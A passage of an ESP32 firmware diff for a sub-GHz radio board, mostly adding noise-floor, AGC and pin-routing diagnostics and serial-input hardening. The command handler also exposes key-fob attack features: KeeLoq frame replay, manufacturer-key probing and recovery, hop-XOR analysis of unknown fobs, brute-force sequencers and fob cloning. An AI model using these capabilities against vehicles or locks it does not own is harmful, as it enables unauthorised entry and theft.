     uint32_t sn=(uint32_t)(unsigned long)jcmd["sn"];
@@ -10695,6 +12664,10 @@ static void processCommandLine(const String& ln){
     bool wasScan=scanActive; scanActive=false;
     replaySeq(proto,sn,ctr,delta,mhz,te,ctrl,n);
     scanActive=wasScan;
+  }
+  // { cmd:"brute_status" } — progress of the HTTP brute sequencers (bruteTick).
+  else if(op=="brute_status"){
+    serialEmit(bruteStatusJson());
   }
   // ─── Manufacturer-key management ─────────────────────────────────────
   else if(op=="key_add"){
@@ -10790,6 +12763,22 @@ static void processCommandLine(const String& ln){
     serialEmit(String("{\"cmd\":\"key_recover_status\",\"active\":")
                + (KR.active?"true":"false")
                + ",\"got\":" + KR.got + ",\"need\":" + KR.need + "}");
+  }
+  // ── hop_xor ───────────────────────────────────────────────────────────
+  // Report the hop-XOR telemetry for the accumulated KeeLoq frames: the raw
+  // ring plus one XOR strip per consecutive pair (hop_xor, ctr_xor, flip_bits,
+  // ctr_step1, same_btn, repeat). This is the structural layer beneath
+  // key_probe — it needs NO manufacturer key and works on an unknown fob.
+  //
+  // Usage: {"cmd":"hop_xor"}
+  else if(op=="hop_xor"){
+    JsonDocument hd;
+    hd["cmd"]="hop_xor";
+    hd["ok"]=(KL_RECENT_CNT>=1);
+    hd["reason"]=(KL_RECENT_CNT>=1)?"":"no-keeloq-frames";
+    if(KL_RECENT_CNT>=1) ks_hopXorEmit(hd);
+    else hd["hint"]="Press a KeeLoq fob 2+ times with the scanner active, then retry";
+    String os; serializeJson(hd,os); serialEmit(os);
   }
   // ── key_probe ─────────────────────────────────────────────────────────
   // Test a candidate 64-bit manufacturer key against the last 2-5 KeeLoq
@@ -11103,13 +13092,17 @@ static void processCommandLine(const String& ln){
     // Put the rail back before finishing.
     digitalWrite(PIN_SENSOR_CE,HIGH); delay(50);
 
-    // Restore the normal capture configuration: GDO0 back to serial-data output,
-    // LoRa released from reset (and left asleep by loraHardReset semantics).
-    digitalWrite(PIN_LORA_RST,HIGH);
+    // Restore the normal capture configuration: GDO0 back to serial-data output.
     SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
     cc_writeReg(0x02,0x0D); cc_strobe(0x36); delay(1); cc_strobe(0x34);
     SPI.endTransaction();
     pinMode(PIN_GDO0,INPUT);
+    // Park the SX1278, which is the state setup() and captureSignal() both leave it in.
+    // This used to release RST here, so running the probe silently un-parked the module and
+    // left the board quieter-or-noisier than a capture would see it. Measured: no difference
+    // at 700 MHz in this condition (-109 un-parked vs -109 parked), so this is a consistency
+    // fix, not a noise fix -- but a diagnostic should not change the state it measures in.
+    loraParkReset();
 
     float khz=(float)e1/(float)WIN;        // 1 edge == 1 cycle => edges/ms == kHz
     const float khzt=135.4f;
@@ -11195,6 +13188,12 @@ static void processCommandLine(const String& ln){
     // loraSleepNow() says "Call outside an SPI transaction", which I ignored.
     uint8_t before=0xFF,ver=0x00,silicon=0xFF;
     {
+      // Release reset for the read. Since v3.82 setup() parks the module with RST held LOW,
+      // and a chip held in reset does not answer SPI -- so reading RegVersion without this
+      // returned 0x00 and the check reported SPI_READ_DEAD every time, which is a false
+      // alarm about the hardware rather than a finding about it. The park is restored at the
+      // end of this handler.
+      pinMode(PIN_LORA_RST,OUTPUT); digitalWrite(PIN_LORA_RST,HIGH); delay(12);
       SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
       before=loraReadReg(0x01);               // state going in
       // CONTROL: RegVersion (0x42) reads 0x12 on a live SX1278. Without this, a
@@ -11234,6 +13233,9 @@ static void processCommandLine(const String& ln){
     digitalWrite(PIN_SENSOR_CE,LOW); delay(150);
     int drvRailOff=canDriveHigh();
     digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);   // restore
+    // Park, matching setup()/captureSignal(). The probe's own (b) step drove RST LOW to test
+    // drivability and then released it; leaving it released would un-park the module.
+    loraParkReset();
     bool railOn=(drvAsleep==1||drvRstHeld==1);
     bool railOff=(drvRailOff==1);
     serialEmit(String("{\"cmd\":\"lora_sleep_check\",")+
@@ -11259,6 +13261,186 @@ static void processCommandLine(const String& ln){
         : railOn
         ? "the pin is drivable with the LoRa powered: the sleep does release DIO0 on this unit"
         : "SPI is live and RegOpMode reads 0x00, yet the pin cannot be raised, so SLEEP does not release DIO0 on this part and the LoRa must be powered down for capture" )+"\"}");
+  }
+  // {"cmd":"lora_power_floor","f":360.0} — does the SX1278 itself raise the floor?
+  //
+  // The band-1/band-2 elevation has structure the CC1101 alone should not produce: two hot
+  // regions at 360 and 440 MHz with a quiet gap at 384-424, and band 3 clean throughout
+  // The SX1278 tunes 137-525 MHz, so band 1 and band 2 are inside its
+  // range and band 3 is outside it — which would explain the structure if the module is
+  // what is being heard.
+  //
+  // This measures the same frequency with the CC1101 held in one configuration and the
+  // SX1278 in each of its four power states, so the module is the only variable. The
+  // CC1101 is re-strobed into RX before each reading because the rail transitions below
+  // disturb it, and a floor read on a radio that is not receiving is the fault that made
+  // rx_floor_check give three different answers.
+  //
+  // Receive-only. Restores the parked state on exit.
+  else if(op=="lora_power_floor"){
+    bool wasScanP=scanActive; scanActive=false;
+    float f=jcmd.containsKey("f")?(float)jcmd["f"]:360.0f;
+    auto ccFloor=[&](int n)->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_setFreq(f);
+      cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);   // settle before sampling
+      long s=0;
+      for(int i=0;i<n;i++){ s+=cc_fastRSSI(); delayMicroseconds(500); }
+      SPI.endTransaction();
+      return (int)(s/n);
+    };
+    auto loraState=[&](const char* which)->int{
+      if(!strcmp(which,"parked")){
+        loraParkReset();                                  // CS high, RST held LOW
+      } else if(!strcmp(which,"rst_high")){
+        pinMode(PIN_LORA_CS,OUTPUT);   digitalWrite(PIN_LORA_CS,HIGH);
+        pinMode(PIN_LORA_RST,OUTPUT);  digitalWrite(PIN_LORA_RST,HIGH);
+      } else if(!strcmp(which,"rail_off")){
+        pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,LOW);
+      } else if(!strcmp(which,"rail_on_awake")){
+        pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+        pinMode(PIN_LORA_RST,OUTPUT);  digitalWrite(PIN_LORA_RST,LOW);
+        delayMicroseconds(200);
+        digitalWrite(PIN_LORA_RST,HIGH); delay(12);       // out of reset, unconfigured
+      }
+      delay(50);
+      return ccFloor(24);
+    };
+    // rail must be up for the three states that need it
+    pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+    int fAwake  = loraState("rail_on_awake");
+    int fRstHigh= loraState("rst_high");
+    int fParked = loraState("parked");
+    int fRailOff= loraState("rail_off");
+    // put everything back the way capture expects it
+    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+    loraParkReset();
+    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+    cc_strobe(0x36); delay(1); cc_strobe(0x34);
+    SPI.endTransaction();
+    int awakeToParked = fAwake - fParked;      // positive = parking lowered the floor
+    serialEmit(String("{\"cmd\":\"lora_power_floor\",\"freq\":")+String(f,2)+
+      ",\"awake\":{\"marc\":0,\"floor_dbm\":"+String(fAwake)+"}"+
+      ",\"rst_high_held\":{\"floor_dbm\":"+String(fRstHigh)+"}"+
+      ",\"parked\":{\"floor_dbm\":"+String(fParked)+"}"+
+      ",\"rail_off\":{\"floor_dbm\":"+String(fRailOff)+"}"+
+      ",\"awake_minus_parked_db\":"+String(awakeToParked)+
+      ",\"verdict\":\""+String(awakeToParked>=8?"SX1278_RAISES_FLOOR":
+                              (awakeToParked<=3?"MODULE_IRRELEVANT":"PARTIAL"))+"\","+
+      "\"note\":\""+String(awakeToParked>=8
+        ? "the floor drops when the module is parked and rises again when it is awake at the same frequency with the same CC1101 configuration, so the SX1278 is what is being received"
+        : (awakeToParked<=3
+          ? "parking the module does not move the floor at this frequency, so the elevation is not this module"
+          : "the module moves the floor but by less than the full elevation: more than one contributor"))+"\"}");
+    scanActive=wasScanP;
+  }
+  // {"cmd":"agc_tilt"} — which register makes the noise floor tilt with frequency?
+  //
+  // A Flipper Zero in the same room reads a flat floor (315 and 868 within 2 dB) and this
+  // card reads flat too when its registers are at power-on-reset values. It reads 22 dB
+  // tilted with the configuration cc_init() writes. So the tilt is a configuration
+  // property, not interference and not a latch.
+  //
+  // This sweeps the two fields that set front-end gain and measures the floor at a band-1
+  // frequency and a band-3 frequency for each, reporting the tilt. A configuration that
+  // flattens the tilt while keeping the floor low is the candidate fix; one that flattens
+  // it only by raising band 3 is not.
+  //
+  // Receive-only. Restores AGCCTRL2/FREND1/AGCCTRL1 before returning.
+  else if(op=="agc_tilt"){
+    bool wasScanT=scanActive; scanActive=false;
+    float fLow =jcmd.containsKey("f_low") ?(float)jcmd["f_low"] :315.0f;
+    float fHigh=jcmd.containsKey("f_high")?(float)jcmd["f_high"]:868.3f;
+    auto floorAt=[&](float f)->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_setFreq(f);
+      cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);
+      long s=0; for(int i=0;i<20;i++){ s+=cc_fastRSSI(); delayMicroseconds(500); }
+      SPI.endTransaction();
+      return (int)(s/20);
+    };
+    auto setReg=[&](uint8_t a,uint8_t v){
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_writeReg(a,v);
+      cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(8);
+      SPI.endTransaction();
+    };
+    // Compact reply on purpose. The first version built a thirteen-entry array plus two
+    // long note strings, and the card accepted the command but never emitted anything --
+    // consistent with the concatenation running out of heap on a board that has WiFi and
+    // BLE live. Eight small fields carry the same measurement.
+    int bestMt=-1, bestTilt=9999;
+    String tilts="";
+    for(int mt=0;mt<8;mt++){
+      setReg(0x1B,(uint8_t)(0x40|mt));            // AGCCTRL2, same MAX_DVGA bits
+      int lo=floorAt(fLow), hi=floorAt(fHigh);
+      int tilt=lo-hi;                              // positive = band 1 hotter than band 3
+      if(lo<-90 && tilt<bestTilt){ bestTilt=tilt; bestMt=mt; }
+      if(mt) tilts+=",";
+      tilts+=String(tilt);
+    }
+    // FREND1: front-end LNA and mixer bias. Default is 0x56; capture uses 0xB6.
+    setReg(0x1B,0x43);
+    String fr=""; String frTilts="";
+    static const uint8_t FRV[]={0x56,0x96,0xB6};
+    for(uint8_t fv: FRV){
+      setReg(0x22,fv);
+      int tilt=floorAt(fLow)-floorAt(fHigh);
+      if(fr.length()) { fr+=","; frTilts+=","; }
+      fr+=String(fv,HEX); frTilts+=String(tilt);
+    }
+    // restore the capture configuration
+    setReg(0x1B,0x43); setReg(0x22,0xB6); setReg(0x1A,0x6C);
+    serialEmit(String("{\"cmd\":\"agc_tilt\",\"mt_tilt\":[")+tilts+
+      "],\"mt_floor_ok\":"+String(bestMt)+
+      ",\"mt_flattest\":"+String(bestMt)+
+      ",\"mt_min_tilt\":"+String(bestTilt)+
+      ",\"fr_regs\":["+fr+"],\"fr_tilt\":["+frTilts+"]}");
+    scanActive=wasScanT;
+  }
+  // {"cmd":"frend0_tilt","pa":1} — is the tilt the PA table's doing?
+  //
+  // The board reads a flat floor (315 within 4 dB of 868) with its registers at power-on-reset
+  // values, and 22 dB tilted with the configuration cc_init writes. MAGN_TARGET
+  // and FREND1 both fail to account for it: sweeping MAGN_TARGET across all eight values moves
+  // the tilt only between 13 and 19 dB, and three FREND1 settings move it by 1 dB.
+  //
+  // FREND0 is the one register that differs between the two states and has not been tested.
+  // cc_init() writes 0x06, which sets PA_POWER=2, so TX uses PATABLE index 2. What the receive
+  // path does with that is not documented in terms the datasheet states plainly, and the reset
+  // value is 0. This toggles PA_POWER across 0-7 and reports the tilt for each.
+  //
+  // Receive-only. Restores the capture configuration before returning.
+  else if(op=="frend0_tilt"){
+    bool wasScanF0=scanActive; scanActive=false;
+    float fLowF0 =jcmd.containsKey("f_low") ?(float)jcmd["f_low"] :315.0f;
+    float fHighF0=jcmd.containsKey("f_high")?(float)jcmd["f_high"]:868.3f;
+    auto floorF0=[&](float f)->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_setFreq(f);
+      cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);
+      long s=0; for(int i=0;i<20;i++){ s+=cc_fastRSSI(); delayMicroseconds(500); }
+      SPI.endTransaction();
+      return (int)(s/20);
+    };
+    auto setF0=[&](uint8_t v){
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_writeReg(0x22,v);
+      cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(8);
+      SPI.endTransaction();
+    };
+    // PA_POWER is bits 2:0 of FREND0. 0x06 (the shipped value) is PA_POWER=6.
+    String t=""; String low=""; String high="";
+    for(int p=0;p<8;p++){
+      setF0((uint8_t)(0x06|p));            // keep LODIV_BUF_CURRENT_TX bits as shipped
+      int lo=floorF0(fLowF0), hi=floorF0(fHighF0);
+      if(p){ t+=","; low+=","; high+=","; }
+      t+=String(lo-hi); low+=String(lo); high+=String(hi);
+    }
+    setF0(0x06);                            // restore
+    serialEmit(String("{\"cmd\":\"frend0_tilt\",\"pa_tilt\":[")+t+
+      "],\"pa_low\":["+low+"],\"pa_high\":["+high+"],\"shipped_frend0\":6}");
+    scanActive=wasScanF0;
   }
   // {"cmd":"gdo0_rail_test"} — before wiring the rail cut into captureSignal, prove
   // the CC1101 still works with the sensor rail down. If SPI dies when the LoRa
@@ -11302,10 +13484,131 @@ static void processCommandLine(const String& ln){
         : (drvRailOff==1&&drvRailOn==0)
         ? "CC1101 still answers (0x14) with the rail down, and pin 48 is free only then: the rail cut is viable"
         : "unexpected combination, see the raw fields" )+"\"}");
+    // The rail test ends with the rail restored but RST wherever it was; park it so the
+    // resting state matches setup()/captureSignal().
+    loraParkReset();
+  }
+  // {"cmd":"gdo0_signal"} — the ONE experiment the other probes cannot run: with the
+  // LoRa powered OFF, does the CC1101 actually put a signal on pin 48?
+  //
+  // Every prior test ran with the LoRa merely asleep or held in reset, and gdo0_isolate
+  // tri-states the CC1101 at the moment it would need to drive. That leaves a blind
+  // spot, because two outputs on one net behave like open-drain: whichever sinks LOW
+  // wins, and the other's HIGH is simply masked. So "pin 48 is sunk with the CC1101
+  // tri-stated" cannot by itself prove the CC1101 fails to drive it.
+  //
+  // This cuts the LoRa's power, which removes the SX1278's DIO0 completely, then has
+  // the CC1101 emit its crystal clock on GDO0 (IOCFG0=0x3F, CLK_XOSC/192, SRX) and
+  // counts the edges. The GDO0 net idles LOW with no clock, so an idle read is 0
+  // either way: only a NONZERO edge count is meaningful, and it means the CC1101 does
+  // reach the pin. No RF is transmitted; this only observes the clock.
+  else if(op=="gdo0_signal"){
+    const uint16_t WIN=60;                 // ms per sample
+    auto countEdges=[&](uint16_t ms,uint32_t& edges,int& hi)->int{
+      int last=-1; edges=0; hi=0; uint32_t t0=millis();
+      while(millis()-t0<ms){
+        int v=digitalRead(PIN_GDO0)?1:0;
+        if(last>=0 && v!=last) edges++;
+        if(v) hi++;
+        last=v;
+      }
+      return last;
+    };
+    auto ccReg=[&](uint8_t r)->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      int v=cc_readReg(r); SPI.endTransaction(); return v;
+    };
+    auto ccStatus=[&](uint8_t r)->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      int v=cc_readStatus(r); SPI.endTransaction(); return v;
+    };
+    // Positive control: can the ESP32 itself drive and read pin 48 right now? If yes,
+    // the read path is good and a zero edge count from the CC1101 means "no signal",
+    // not "dead pad". GPIO_MODE_INPUT_OUTPUT so both buffers are on.
+    auto espLoop=[]()->int{
+      pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
+      gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
+      digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
+      int v=digitalRead(PIN_GDO0);
+      pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
+      return v;
+    };
+    pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+    loraHardReset();
+    pinMode(PIN_GDO0,INPUT);
+    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+    cc_writeReg(0x02,0x3F); cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(2);
+    SPI.endTransaction();
+    uint32_t eClockOn; int hiClockOn=0; countEdges(WIN,eClockOn,hiClockOn);
+    int io0rbOn=ccReg(0x02);               // prove the clock config landed
+    int marcOn=ccStatus(0x35)&0x1F;        // MARCSTATE: 0x0D = RX, so XOSC is running
+    int verOn=ccStatus(0x31);              // VERSION: 0x14 = CC1101 alive
+    int loopOn=espLoop();
+    // Remove the LoRa's power. The rail cut is only useful if the CC1101 survives it,
+    // so read VERSION first (a status register, the ground truth) — a config readback
+    // can look wrong when the shared MISO is disturbed. If the chip is alive, re-assert
+    // the clock config, because a brownout can drop it, and THEN sample: that is the
+    // state the other probes could never reach, LoRa gone and CC1101 driving.
+    digitalWrite(PIN_SENSOR_CE,LOW);                    // LoRa fully unpowered
+    delay(150);
+    pinMode(PIN_GDO0,INPUT); delay(2);
+    int verOff=ccStatus(0x31);
+    bool chipAliveOff=(verOff==0x14);
+    if(chipAliveOff){
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_writeReg(0x02,0x3F); cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(2);
+      SPI.endTransaction();
+    }
+    uint32_t eRailOff; int hiRailOff=0; countEdges(WIN,eRailOff,hiRailOff);
+    int io0rbOff=ccReg(0x02);
+    int marcOff=ccStatus(0x35)&0x1F;
+    int loopOff=espLoop();
+    // Restore: rail back up, GDO0 back to serial-data output as capture expects.
+    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+    cc_writeReg(0x02,0x0D); cc_strobe(0x36); delay(1); cc_strobe(0x34);
+    SPI.endTransaction();
+    pinMode(PIN_GDO0,INPUT);
+    loraParkReset();
+    // The verdict. On this board the CC1101 shares the sensor rail with the LoRa, so
+    // cutting the rail to free pin 48 also removes the CC1101 — the two cannot be
+    // isolated electrically here. That is itself the finding: a rail cut can never
+    // answer the routing question, and the vendor firmware agrees (it tells the user to
+    // solder a bridge from the CC1101's GDO0 to a free GPIO). Everything short of that
+    // bodge wire is inference, so report it as such rather than as a routing verdict.
+    bool cfgLanded=(io0rbOn==0x3F && marcOn==0x0D);
+    bool readPathOk=(loopOff==1 || loopOn==1);
+    bool routed=(chipAliveOff && eRailOff>8);
+    String verdict = !cfgLanded
+      ? String("TEST_INVALID")
+      : (!chipAliveOff ? String("RAIL_SHARED_CANNOT_ISOLATE")
+      : (routed ? String("GDO0_REACHES_PIN48")
+      : (readPathOk ? String("GDO0_NOT_ROUTED") : String("TEST_INVALID"))));
+    serialEmit(String("{\"cmd\":\"gdo0_signal\",")+
+      "\"version_on\":\""+String(verOn,HEX)+"\","+
+      "\"version_off\":\""+String(verOff,HEX)+"\","+
+      "\"iocfg0_readback_on\":\""+String(io0rbOn,HEX)+"\","+
+      "\"iocfg0_readback_off\":\""+String(io0rbOff,HEX)+"\","+
+      "\"marcstate_on\":\""+String(marcOn,HEX)+"\","+
+      "\"marcstate_off\":\""+String(marcOff,HEX)+"\","+
+      "\"esp_loop_on\":"+String(loopOn)+","+
+      "\"esp_loop_off\":"+String(loopOff)+","+
+      "\"clock_edges_rail_on\":"+String(eClockOn)+","+
+      "\"clock_hi_rail_on\":"+String(hiClockOn)+","+
+      "\"clock_edges_rail_off\":"+String(eRailOff)+","+
+      "\"clock_hi_rail_off\":"+String(hiRailOff)+","+
+      "\"verdict\":\""+verdict+"\","+
+      "\"note\":\""+String(!cfgLanded
+        ? "the CC1101 did not reach RX with GDO0=CLK_XOSC/192, so the edge count means nothing"
+        : !chipAliveOff
+        ? "cutting the rail removes the LoRa's power AND the CC1101's (they share the sensor rail): the two outputs cannot be isolated electrically on this board, so the routing question cannot be settled from firmware. The CC1101's XOSC clock also does not appear on pin 48 in the powered state, and the vendor's own firmware says GDO0 is not wired and tells the user to bridge GDO0 (CC1101 pin 6) to a free GPIO"
+        : routed
+        ? "with the LoRa unpowered the CC1101's XOSC clock appears on pin 48: GDO0 IS wired to GPIO48 and the SX1278 was masking it"
+        : "the CC1101 is alive and free of the LoRa, ESP32 can read pin 48, yet no clock: GDO0 is not routed")+"\"}");
   }
   // {"cmd":"gdo0_isolate"} — which chip actually sinks GPIO48?
   //
-  // §5.5 of research/14 leaves two candidates, and they need opposite fixes:
+  // §5.5 leaves two candidates, and they need opposite fixes:
   //   · SX1278 DIO0        -> hardware change (sleep and reset both fail to release it)
   //   · CC1101's own GDO0  -> NOT a fault: IOCFG0=0x0D is SUPPOSED to drive the pin.
   //                           The real bug would be the toggle test running with no
@@ -11376,6 +13679,7 @@ static void processCommandLine(const String& ln){
     int dDrv=drv();
     digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
     ccRestore();                                      // back to capture config
+    loraParkReset();                                  // matching setup()/captureSignal()
 
     bool triLanded=(rbTri==0x2E);
     // If tri-stating the CC1101 frees the pin, the CC1101 was the holder — and since
@@ -11432,6 +13736,9 @@ static void processCommandLine(const String& ln){
     int drvWhileRst=digitalRead(PIN_GDO0);
     pinMode(PIN_GDO0,INPUT);
     digitalWrite(PIN_LORA_RST,HIGH); delay(20);
+    // Park it again: this probe deliberately released RST to read RegVersion, but the
+    // resting state for RF work is parked, as setup() and captureSignal() both establish.
+    loraParkReset();
     bool rstWorks=(verLo!=0x12);          // SPI stops answering when truly in reset
     serialEmit(String("{\"cmd\":\"lora_rst_check\",")+
       "\"version_rst_high\":\""+String(verHi,HEX)+"\","+
@@ -11446,7 +13753,7 @@ static void processCommandLine(const String& ln){
         : "the SX1278 still answers SPI with RST held LOW, so the reset is not reaching the chip: on this board the reset cannot be relied on to release DIO0")+"\"}");
   }
   // {"cmd":"tx_fifo_test"} — prove a transmission actually leaves the board, with
-  // no GDO0 and no soldering. research/16 §4 step 1.
+  // no GDO0 and no soldering. §4 step 1.
   //
   // Reads MARCSTATE and TXBYTES from the chip's own status registers, so the verdict
   // is the radio reporting on itself rather than the firmware assuming it worked.
@@ -11642,6 +13949,48 @@ static void processCommandLine(const String& ln){
     else lastCapDiag=!lastCapDiag;
     serialEmit(String("{\"cmd\":\"cap_diag\",\"on\":")+String(lastCapDiag?"true":"false")+"}");
   }
+  // {"cmd":"gaparm","on":true|false} — arm every capture on the frame-gap signature
+  // (N16). With it on, the wait past first energy is bounded by
+  // gapArmBudgetMs; a per-capture {"cmd":"capture","arm":"gap"|"off"} overrides
+  // it once. Quiet-run and budget are adjustable: quiet_us 2000..50000, budget_ms 50..5000.
+  else if(op=="gaparm"){
+    if(jcmd.containsKey("on")) gapArmDefault=(bool)jcmd["on"];
+    else gapArmDefault=!gapArmDefault;
+    if(jcmd.containsKey("quiet_us")){
+      int qu=(int)jcmd["quiet_us"];
+      if(qu>=2000&&qu<=50000) gapArmQuietUs=(uint16_t)qu;
+    }
+    if(jcmd.containsKey("budget_ms")){
+      int bm=(int)jcmd["budget_ms"];
+      if(bm>=50&&bm<=5000) gapArmBudgetMs=(uint16_t)bm;
+    }
+    if(jcmd.containsKey("retries")){
+      int rr=(int)jcmd["retries"];
+      if(rr>=0&&rr<=10) gapArmRetries=(uint8_t)rr;
+    }
+    if(jcmd.containsKey("below_db")){
+      int bd=(int)jcmd["below_db"];
+      if(bd>=0&&bd<=30) gapArmQuietBelowDb=(int8_t)bd;
+    }
+    serialEmit(String("{\"cmd\":\"gaparm\",\"on\":")+String(gapArmDefault?"true":"false")
+      +",\"quiet_us\":"+String(gapArmQuietUs)
+      +",\"budget_ms\":"+String(gapArmBudgetMs)
+      +",\"retries\":"+String(gapArmRetries)
+      +",\"below_db\":"+String(gapArmQuietBelowDb)
+      +",\"last_armed\":"+String(lastCapGapArm?"true":"false")+"}");
+  }
+  // {"cmd":"agc","filter":8|16|32|64} — AGCCTRL0 FILTER_LENGTH for captures (N17).
+  // The stock 16-sample average smears sub-150 µs OOK lows (: ~1/8 of
+  // a Kia frame resolved). 8 tracks the envelope faster, floor gets noisier.
+  // Applied at capture setup; 16 restores today's behavior exactly.
+  else if(op=="agc"){
+    if(jcmd.containsKey("filter")){
+      int fl=(int)jcmd["filter"];
+      if(fl==8||fl==16||fl==32||fl==64) agcFilterLen=(uint8_t)fl;
+    }
+    serialEmit(String("{\"cmd\":\"agc\",\"filter\":")+String(agcFilterLen)
+      +",\"last_nondefault\":"+String(lastCapAgc?"true":"false")+"}");
+  }
   // {"cmd":"rssi_scope","f":315.0,"ms":2000} — what does the edge detector actually see?
   //
   // A capture either produces a report or "no-signal", and neither says *why*. This
@@ -11739,7 +14088,7 @@ static void processCommandLine(const String& ln){
   //     IDLE, so the write might silently drop the chip out of RX. Measured: MARCSTATE
   //     stays 13 (RX) through the writes. The ordering is not the cause. (The strobes do
   //     need their settling gaps, which this command now matches captureSignal() on --
-  //     see research/47.)
+  // )
   //
   //   · AGCCTRL2.MAGN_TARGET. This is the cause, and it is not a fault: the same field
   //     value means different things in OOK and in FSK, because the datasheet gives
@@ -11755,7 +14104,7 @@ static void processCommandLine(const String& ln){
   //
   // Established: MARCSTATE stays 13 (RX) through the FSK writes, so the chip is
   // genuinely receiving; and a low FSK floor reflects the AGC target, not an idle
-  // radio. See research/48.
+  // radio. See
   //
   // This reads MARCSTATE and RSSI at each step, so the answer is measured, not argued.
   else if(op=="rx_floor_check"){
@@ -11941,6 +14290,22 @@ static void processCommandLine(const String& ln){
     serialEmit(String("{\"cmd\":\"fobclone_scan\",\"active\":")+
       (hfcActive?"true":"false")+",\"state\":"+String(hfcState)+",\"ok\":true}");
   }
+  // An unrecognized command with a VALID token must not be silent. Without this
+  // tail a typo'd cmd name vanished the same way an oversized line used to (the
+  // v3.86 defect class) -- the sender cannot tell a typo from a dropped line.
+  // Found by the N16 fuzz suite's structural pass.
+  // The cmd is echoed escaped so the sender sees the typo, but only printable
+  // bytes (raw control chars are illegal inside a JSON string) and only the
+  // first 40, so a pathological cmd cannot bloat the reply.
+  else {
+    String esc; esc.reserve(op.length()<40?op.length():40);
+    for(unsigned int i=0;i<op.length()&&i<40;i++){
+      unsigned char c=(unsigned char)op[i];
+      if(c=='"'||c=='\\'){ esc+='\\'; esc+=(char)c; }
+      else if(c>=0x20)    esc+=(char)c;
+    }
+    serialEmit(String("{\"ok\":false,\"error\":\"unknown-cmd\",\"cmd\":\"")+esc+"\"}");
+  }
 }
 
 // Drain commands the WebSocket handler queued, on the loop() task. Called every loop()
@@ -11970,7 +14335,11 @@ void handleSerial(){
   while(Serial.available()){
     char ch=Serial.read();
     if(ch=='\n'||ch=='\r'){
-      String ln=serialInBuf; serialInBuf=""; ln.trim();
+      if(serialInLen==0) continue;                     // bare CR/LF: nothing staged
+      serialInBuf[serialInLen]='\0';
+      String ln(serialInBuf);
+      serialInLen=0;                                  // intake free BEFORE dispatch
+      ln.trim();
       if(ln.length()<3||ln[0]!='{') continue;
       // Dispatch through the shared handler, which the WiFi WebSocket path also calls,
       // so a command behaves identically on either transport.
@@ -11982,18 +14351,22 @@ void handleSerial(){
       // produced no reply at all, while 40 pulses (248 chars) worked. Measured threshold:
       // 248 chars replies, 264 chars is silent.
       //
-      // SERIAL_CMD_MAX is sized for the largest command this firmware accepts. The import's
-      // pulse list is the widest: SUB_REPLAY_MAX_PULSES (3740) worst-case 5-digit values
-      // would be ~19 KB, which is more than is sane to hold as a String, so the serial import
-      // is documented as accepting a bounded payload (see the fbk_import handler's limit
-      // note) rather than silently truncating. 8 KB covers every other command with margin.
-      if(serialInBuf.length()<SERIAL_CMD_MAX) serialInBuf+=ch;
-      else if(serialInBuf.length()==SERIAL_CMD_MAX){
+      // SERIAL_CMD_MAX (2048) covers every serial command with margin: the widest documented
+      // line is fbk_pulses_add's 48-pulse slice (~240 B); larger imports use the staged
+      // form. The HTTP route carries the one-shot 16 KB body; serial never needed to.
+      if(serialInLen<SERIAL_CMD_MAX){
+        serialInBuf[serialInLen++]=ch;
+      } else if(serialInLen==SERIAL_CMD_MAX){
         // Report the overflow ONCE rather than dropping the line in silence -- a discarded
-        // command that produces no output is the defect this bound used to cause.
+        // command that produces no output is the defect this bound used to cause. The
+        // sentinel (serialInLen=SERIAL_CMD_MAX+1) stops accumulation and stops the
+        // warning; the line still closes on its '\n' and dispatches (as bad-json,
+        // since the tail was dropped), so the console survives the burst. Found by the
+        // N16 fuzz suite: with the old String buffer, one 9 KB line
+        // both wedged the CDC stream and swallowed every later command until reboot.
         serialEmit(String("{\"ok\":false,\"error\":\"serial-line-too-long\",\"max_bytes\":")+
                    String(SERIAL_CMD_MAX)+"}");
-        serialInBuf+='\0';   // sentinel: stop accumulating, and stop repeating the warning
+        serialInLen=SERIAL_CMD_MAX+1;   // sentinel: one past the cap
       }
     }
   }
@@ -12063,6 +14436,13 @@ void checkButton(){
 // ─── Setup ────────────────────────────────────────────────────────────────────
 // RF always enabled (open build)
 
+// BENCH heap probes: print free/max/min contiguous heap at each subsystem
+// bring-up so a starved boot can be attributed to the stage that consumed it.
+// printf does not allocate the way String concatenation does, so it still
+// reports correctly when the heap is nearly gone.
